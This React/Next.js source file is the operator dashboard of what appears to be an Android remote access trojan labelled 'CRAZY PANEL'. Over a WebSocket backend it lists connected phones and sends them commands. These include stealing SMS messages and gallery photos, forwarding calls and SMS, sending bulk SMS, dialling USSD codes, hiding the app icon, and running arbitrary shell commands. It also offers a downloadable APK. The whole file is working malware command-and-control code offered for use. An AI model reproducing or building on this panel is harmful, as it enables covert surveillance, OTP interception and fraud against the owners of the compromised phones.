"use client";
import { useState, useEffect, useRef } from 'react';
import { useRouter } from 'next/navigation';

export default function Dashboard() {
  const [activeTab, setActiveTab] = useState('Home');
  const [subTab, setSubTab] = useState('Home');
  const [devices, setDevices] = useState<Record<string, any>>({});
  const [selectedDevice, setSelectedDevice] = useState<string | null>(null);
  
  const [toast, setToast] = useState<string | null>(null);
  const [gallery, setGallery] = useState<string[]>([]);
  const [messages, setMessages] = useState<any[]>([]);
  const [perms, setPerms] = useState<any>({});
  const [cmd, setCmd] = useState('');
  const [out, setOut] = useState('Ready...');

  const ws = useRef<WebSocket | null>(null);
  const router = useRouter();

  useEffect(() => {
    ws.current = new WebSocket('wss://onxy-backend.onrender.com/ws?role=admin');
    ws.current.onmessage = (e) => {
      try {
        const d = JSON.parse(e.data);
        if (d.device_id && d.type !== 'error') {
          setDevices(p => ({ ...p, [d.device_id]: { ...p[d.device_id], ...d } }));
          if (!selectedDevice) setSelectedDevice(d.device_id);
        }
        if (d.type === 'gallery_response') { 
          if (d.images) {
            setGallery(prev => d.offset === 0 ? d.images : [...prev, ...d.images]); 
            showToast(`Fetched ${d.images.length} photos`); 
          }
        }
        if (d.type === 'sms_response') { setMessages(d.messages || []); showToast(`Fetched messages`); }
        if (d.type === 'permissions_response') { setPerms(d.permissions || {}); showToast('Permissions updated'); }
        if (d.type === 'shell_response') { setOut(d.data); showToast('Command executed'); }
      } catch (err) {}
    };
    return () => ws.current?.close();
  }, [selectedDevice]);

  const showToast = (m: string) => { setToast(m); setTimeout(() => setToast(null), 3000); };
  
  const send = (c: string, p: any = {}) => {
    if (ws.current?.readyState === WebSocket.OPEN && selectedDevice) {
      ws.current.send(JSON.stringify({ target: selectedDevice, type: 'cmd', command: c, payload: p }));
      showToast(`Sending ${c}...`);
    } else showToast("No device selected");
  };

  const handleAction = (c: string) => {
    if (c === 'CALL_FORWARD') {
      const num = prompt('Enter phone number for Call Forwarding:');
      if (num) send(c, { number: num });
    } else if (c === 'SEND_SMS') {
      const num = prompt('Enter phone number to Send SMS:');
      if (num) {
        const msg = prompt('Enter message body:');
        if (msg) send(c, { number: num, message: msg });
      }
    } else if (c === 'DIAL_USSD') {
      const code = prompt('Enter USSD code (e.g., *123#):');
      if (code) send(c, { code: code });
    } else {
      send(c);
    }
  };

  const logout = () => { document.cookie = 'auth_token=; Max-Age=0; path=/;'; router.push('/login'); };
  
  const deviceList = Object.values(devices);
  const dev = selectedDevice ? devices[selectedDevice] || {} : {};

  return (
    <div className="min-h-screen bg-[#0B0C10] text-white font-sans pb-10">
      {toast && <div className="fixed top-4 left-1/2 transform -translate-x-1/2 z-50 bg-[#1A1B23] border border-purple-500 px-6 py-3 rounded-lg shadow-lg text-sm">{toast}</div>}

      {/* HEADER (Purana Style) */}
      <header className="flex justify-between items-center p-4 border-b border-gray-800 bg-[#0B0C10]">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-full bg-purple-600/20 border border-purple-500 flex items-center justify-center text-xl text-purple-400">👤</div>
          <div>
            <h1 className="font-bold text-lg text-purple-500 tracking-wide">CRAZY PANEL</h1>
            <p className="text-xs text-gray-400">Web Admin</p>
          </div>
        </div>
        
        <div className="flex items-center gap-3">
          {/* Device Selector Dropdown (Kyunki sidebar hata diya hai) */}
          {deviceList.length > 0 && (
            <select 
              onChange={(e) => setSelectedDevice(e.target.value)} 
              value={selectedDevice || ''} 
              className="bg-[#1A1B23] border border-purple-800 text-sm p-2 rounded-lg outline-none text-purple-200"
            >
              {deviceList.map((d: any) => (
                <option key={d.device_id} value={d.device_id}>{d.model || 'Unknown'} ({d.device_id.slice(0,6)})</option>
              ))}
            </select>
          )}
          <a href="/crazy-onxy-MDM/app-debug.apk" download className="hidden md:block bg-[#1A1B23] border border-purple-600 hover:bg-purple-900 text-white px-4 py-1.5 rounded-lg font-bold text-sm transition">⬇ APK</a>
          <button onClick={logout} className="text-xs text-red-400 border border-red-900 px-3 py-1.5 rounded-lg hover:bg-red-900 transition">Logout</button>
        </div>
      </header>

      {/* TOP NAVIGATION (Purana Style) */}
      <nav className="flex gap-6 p-4 border-b border-gray-800 text-sm overflow-x-auto bg-[#0B0C10]">
        {['Home', 'Messages', 'Gallery', 'Permissions', 'Terminal'].map(tab => (
          <button key={tab} onClick={() => {setActiveTab(tab); setSubTab(tab);}} className={`pb-2 whitespace-nowrap transition-colors ${activeTab === tab ? 'border-b-2 border-purple-500 text-white font-bold' : 'text-gray-400 hover:text-gray-200'}`}>{tab === 'Messages' ? 'Messages' : tab}</button>
        ))}
      </nav>

      <main className="p-4 max-w-7xl mx-auto">
        {selectedDevice ? (
          <>
            {/* DEVICE INFO CARD (Purana Style) */}
            <div className="bg-[#1A1B23] p-5 rounded-xl border border-gray-800 mb-6 relative overflow-hidden">
              <h2 className="text-xl font-bold mb-4 flex items-center gap-2">{dev.model || 'Unknown'} <span className="text-xs bg-green-900/50 border border-green-700 text-green-400 px-2 py-0.5 rounded">Live</span></h2>
              <div className="grid grid-cols-2 md:grid-cols-4 gap-y-4 gap-x-8 text-sm">
                <div className="flex justify-between border-b border-gray-800/50 pb-2"><span className="text-gray-400">ID</span> <span className="text-gray-200">{selectedDevice}</span></div>
                <div className="flex justify-between border-b border-gray-800/50 pb-2"><span className="text-gray-400">IP Address</span> <span className="text-blue-400">{dev.ip || 'N/A'}</span></div>
                <div className="flex justify-between border-b border-gray-800/50 pb-2"><span className="text-gray-400">Android</span> <span className="text-gray-200">{dev.android || 'N/A'}</span></div>
                <div className="flex justify-between border-b border-gray-800/50 pb-2"><span className="text-gray-400">Battery</span> <span className="text-green-400">{dev.battery ? `${dev.battery}%` : 'N/A'}</span></div>
              </div>
            </div>

            {/* TABS CONTENT */}
            {subTab === 'Home' && (
              <div className="grid grid-cols-2 md:grid-cols-5 gap-4 mb-8">
                {[
                  {l:'Check Online', i:'📡', c:'CHECK_ONLINE'}, {l:'GET SMS', i:'📥', c:'GET_SMS'},
                  {l:'Bulk SMS', i:'✉️', c:'BULK_SMS'}, {l:'Send SMS', i:'📤', c:'SEND_SMS'},
                  {l:'SMS Forward', i:'🔄', c:'SMS_FORWARD'}, {l:'Call Forward', i:'📞', c:'CALL_FORWARD'},
                  {l:'Dial USSD', i:'🔢', c:'DIAL_USSD'}, {l:'Hide Icon', i:'🕵️', c:'HIDE_ICON'},
                  {l:'Dev Settings', i:'⚙️', c:'OPEN_DEVELOPER_SETTINGS'}, {l:'Battery Settings', i:'🔋', c:'OPEN_BATTERY_SETTINGS'}
                ].map((b,i) => (
                  <button key={i} onClick={() => handleAction(b.c)} className="bg-[#1A1B23] border border-gray-800 hover:border-purple-500 p-4 rounded-xl flex flex-col items-center justify-center gap-2 transition group">
                    <span className="text-2xl group-hover:scale-110 transition">{b.i}</span>
                    <span className="text-xs font-semibold text-gray-300 text-center">{b.l}</span>
                  </button>
                ))}
              </div>
            )}

            {subTab === 'Messages' && (
              <div className="space-y-4">
                <button onClick={() => send('GET_SMS')} className="bg-purple-600 hover:bg-purple-500 px-4 py-2 rounded text-sm font-bold">Fetch Messages</button>
                {messages.length === 0 ? <div className="text-gray-500 text-sm">No messages.</div> : messages.map((m, i) => (
                  <div key={i} className="bg-[#1A1B23] p-4 rounded-xl border border-gray-800 text-sm">
                    <div className="flex justify-between text-xs text-gray-400 mb-2"><span>{m.address}</span><span>{m.date}</span></div>
                    <p>{m.body}</p>
                  </div>
                ))}
              </div>
            )}

            {subTab === 'Gallery' && (
              <div className="space-y-4">
                <div className="flex gap-4 mb-4">
                  <button onClick={() => { setGallery([]); send('GET_GALLERY', {limit: 500, offset: 0}); }} className="bg-blue-600 hover:bg-blue-500 px-4 py-2 rounded text-sm font-bold">Load First 500 Photos</button>
                  {gallery.length > 0 && <button onClick={() => send('GET_GALLERY', {limit: 500, offset: gallery.length})} className="bg-purple-600 hover:bg-purple-500 px-4 py-2 rounded text-sm font-bold">Load More (+500)</button>}
                </div>
                <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-4">
                  {gallery.map((b, i) => <img key={i} src={`data:image/jpeg;base64,${b}`} className="w-full h-40 object-cover rounded-lg border border-gray-700" />)}
                </div>
                {gallery.length === 0 && <div className="text-gray-500 text-center py-10 text-sm">Click 'Load First 500 Photos' to fetch gallery.</div>}
              </div>
            )}

            {subTab === 'Permissions' && (
              <div className="bg-[#1A1B23] p-6 rounded-xl border border-gray-800 max-w-2xl">
                <div className="flex justify-between mb-4"><h3 className="font-bold">Live Permissions</h3><button onClick={() => send('GET_PERMISSIONS')} className="bg-gray-700 px-3 py-1 text-xs rounded hover:bg-gray-600">Fetch</button></div>
                {Object.keys(perms).length === 0 ? <div className="text-gray-500 text-sm">Click Fetch.</div> : Object.entries(perms).map(([k, v]: any) => (
                  <div key={k} className="flex justify-between text-sm border-b border-gray-800 py-2"><span>{k}</span><span className={v ? 'text-green-400' : 'text-red-400'}>{v ? '🟢 Allowed' : '🔴 Denied'}</span></div>
                ))}
              </div>
            )}

            {subTab === 'Terminal' && (
              <div className="bg-[#1A1B23] p-4 rounded-xl border border-gray-800">
                <div className="flex gap-2 mb-4"><input type="text" value={cmd} onChange={e => setCmd(e.target.value)} placeholder="e.g. pm list packages" className="bg-[#0B0C10] border border-gray-700 rounded p-2 w-full font-mono text-sm outline-none focus:border-purple-500" /><button onClick={() => send('EXECUTE_SHELL', {command: cmd})} className="bg-green-600 hover:bg-green-500 px-4 py-2 rounded text-sm font-bold">Run</button></div>
                <pre className="bg-[#0B0C10] p-4 rounded text-green-400 text-xs font-mono h-64 overflow-y-auto border border-gray-800">{out}</pre>
              </div>
            )}
          </>
        ) : (
          <div className="text-center text-gray-500 mt-20 animate-pulse text-lg">
            Waiting for device connection...
          </div>
        )}
      </main>
    </div>
  );
}
